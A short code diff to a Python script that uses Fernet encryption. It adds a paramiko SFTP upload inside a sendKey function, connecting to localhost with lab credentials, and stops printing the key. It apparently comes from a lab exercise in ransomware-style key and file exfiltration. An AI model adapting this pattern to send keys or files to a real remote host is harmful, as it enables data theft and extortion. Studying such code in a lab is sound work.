@@ -4,6 +4,7 @@ import requests
 import os
 import sys
 import signal
+import paramiko
 from cryptography.fernet import Fernet
 
 
@@ -44,12 +45,21 @@ def secureConnection():
 
 
 def sendKey(key):
+    # paramiko.util.log_to_file("paramiko.log")
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect("localhost", username='lab', password='lab')
+    # or
+    # key = paramiko.RSAKey.from_private_key_file('id_rsa')
+    # ssh.connect(host, username='user', pkey=key)
+    sftp = ssh.open_sftp()
+    # sftp.get(remotepath, localpath)
+    sftp.put("/home/test/test.txt", "/home/lab/sent.txt")
     try:
         with open("/home/test/key.key", "wb") as keyFile:
             keyFile.write(key)
     except Exception as e:
         print(e)
-    print(key)
 
 
 if __name__ == '__main__':
